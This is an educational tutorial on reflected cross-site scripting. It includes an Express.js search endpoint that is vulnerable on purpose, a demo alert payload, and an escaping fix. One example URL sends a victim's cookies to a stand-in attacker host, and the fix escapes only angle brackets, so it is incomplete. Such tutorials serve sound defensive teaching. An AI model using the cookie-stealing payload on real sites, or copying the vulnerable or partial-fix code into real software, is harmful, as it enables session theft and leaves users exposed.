Reflected XSS Deep Dive & Express Demo

**Reflected XSS** is a common and **high-risk vulnerability** that occurs when a web application takes user input from an HTTP request (like a URL parameter) and immediately includes it **unsanitized** in the web page response. The payload is not stored on the server but **"reflected"** back to the user's browser, where it executes.

Here is a deep dive into how Reflected XSS works, followed by a practical demonstration using Express.js.

🔄 How Reflected XSS Works

The core mechanism of Reflected XSS relies on a victim being tricked into clicking a malicious link containing the attack payload.

  1. Vulnerable Application Feature:

    The attacker identifies a feature on a website that takes user input from the URL (usually a query parameter) and reflects it back on the page. A common example is a search page that displays the search term entered, or an error page that displays the missing filename.

  2. Payload Crafting:

    The attacker injects a malicious script into the vulnerable URL parameter.

    Example Payload:

    https://example.com/search?query=<script>document.location='http://attacker.com/steal.php?c=' + document.cookie;</script>

  3. Delivery (Social Engineering):

    The attacker sends this specially crafted link to a victim, often disguised as a legitimate link in an email or social media message (e.g., "Check out this amazing discount!").

  4. Execution:

    • The victim clicks the link.
    • The victim's browser sends the request, including the malicious script, to the server.
    • The server, running the vulnerable code, takes the <script> payload and inserts it directly into the HTML response.
    • The browser receives the HTML response, parses it, and executes the malicious script embedded within the HTML.
    • The script executes, stealing the victim's session cookie and sending it to the attacker's server (http://attacker.com/steal.php).

🛠️ Practical Demonstration with Express.js

We can demonstrate this attack using a vulnerable Express application setup.

1. The Vulnerable Express Server

This code sets up a simple search endpoint that is vulnerable to Reflected XSS because it trusts and reflects the term parameter directly into the HTML response.

Server File: vulnerable_app.js

// Install required packages: npm install express
import express from 'express';
const app = express();
const port = 3000;

app.get('/search', (req, res) => {
    // 1. Get user input directly from the query parameter
    const searchTerm = req.query.term || 'No term specified';

    // 2. VULNERABLE STEP: Injecting user input directly into the HTML response
    // The server trusts that 'searchTerm' is just text, but it could be HTML/JavaScript.
    const htmlResponse = `
        <!DOCTYPE html>
        <html>
        <head><title>Search Results</title></head>
        <body>
            <h2>Search Results</h2>
            <p>You searched for: <strong>${searchTerm}</strong></p>
            <hr>
            <p>0 results found.</p>
        </body>
        </html>
    `;
    
    // 3. Reflect the response back to the browser
    res.send(htmlResponse);
});

app.listen(port, () => {
    console.log(`Vulnerable app listening at http://localhost:${port}`);
});

2. Execution of the Attack

Run the server: node vulnerable_app.js

A. Harmless Test (Expected Behavior)

If a user performs a normal search, the output is harmless text:

URL: http://localhost:3000/search?term=apple+pie

Output HTML (on victim's browser):

<p>You searched for: <strong>apple pie</strong></p>

B. The Malicious Attack (Reflected XSS)

The attacker crafts a malicious URL containing a JavaScript payload. We'll use a simple alert() for demonstration.

Malicious URL (Attacker's link):

http://localhost:3000/search?term=<script>alert('XSS_ATTACK_SUCCESSFUL')</script>

Vulnerable Output HTML (on victim's browser):

...<p>You searched for: <strong><script>alert('XSS_ATTACK_SUCCESSFUL')</script></strong></p>
...

The victim's browser executes the embedded <script> tag, and a pop-up alert appears. In a real-world scenario, this script would secretly steal session tokens, credentials, or redirect the user to a phishing site.

✅ The Fix: Input Sanitization

The solution to Reflected XSS is to ensure that user input is **always output-encoded** before being rendered on the page, transforming any potentially dangerous characters (<, >, ", etc.) into their safe, literal HTML entities (&lt;, &gt;, &quot;).

Using the Node example above, the fix involves simply escaping the output: 

// The fix: HTML-encode the output before rendering.
// In a real app, use a library like 'he' (HTML Entity Encoder)
import he from 'he';
// const safeSearchTerm = he.encode(searchTerm); // Use this line in a real app

// For this example, we'll manually escape the two most dangerous characters:
const safeSearchTerm = searchTerm.replace(/</g, '&lt;').replace(/>/g, '&gt;');

const safeHtmlResponse = `
    <!DOCTYPE html>
    <html>
    <head><title>Search Results</title></head>
    <body>
        <h2>Search Results</h2>
        <p>You searched for: <strong>${safeSearchTerm}</strong></p>
        <hr>
        <p>0 results found.</p>
    </body>
    </html>
`;

res.send(safeHtmlResponse);

Result of the fix:

When the malicious URL is visited, the output is now safe text:

...<p>You searched for: <strong>&lt;script>alert('XSS_ATTACK_SUCCESSFUL')&lt;/script></strong></p>
...

The browser now displays the text <script>alert('XSS_ATTACK_SUCCESSFUL')</script> literally, without executing it.
